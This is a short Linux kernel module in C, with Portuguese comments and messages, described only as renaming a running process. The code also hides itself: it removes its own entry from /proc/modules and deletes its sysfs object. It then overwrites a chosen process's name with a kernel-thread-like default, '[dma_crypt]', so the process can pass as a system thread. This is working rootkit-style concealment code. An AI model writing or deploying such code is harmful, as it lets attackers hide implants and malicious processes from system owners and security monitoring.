#include <linux/module.h>
#include <linux/init.h>
#include <linux/string.h>
#include <linux/sched/signal.h>

static int process_id = -1;
module_param(process_id, int, 0);

static char *nname = "[dma_crypt]";
module_param(nname, charp, 0);

static int __init lkm_init(void) {
   struct module *me = THIS_MODULE;
   struct task_struct *p;

   if (process_id == -1) {
      pr_info("Favor informe o PID (use o comando: ps aux).\n");
      return -1;
   }

   mutex_lock(&module_mutex);
   // removing from /proc/modules/
   list_del(&me->list);
   // removing from /sys/modules/
   kobject_del(&me->mkobj.kobj);
   mutex_unlock(&module_mutex);

   for_each_process(p) {
      if (p->pid == process_id) {
         memset((void *)p->comm, 0, TASK_COMM_LEN);
         strncpy((char *)p->comm, nname, TASK_COMM_LEN -1);
      }
   }

   return 0;
}

module_init(lkm_init);

MODULE_AUTHOR("Alan Lacerda - alacerda");
MODULE_LICENSE("GPL v2");
MODULE_DESCRIPTION("Alterar o nome de um processo em execucao");
MODULE_PARM_DESC(process_id, "PID do processo que terá o nome alterado");
MODULE_PARM_DESC(nname, "Novo nome (opicional)");
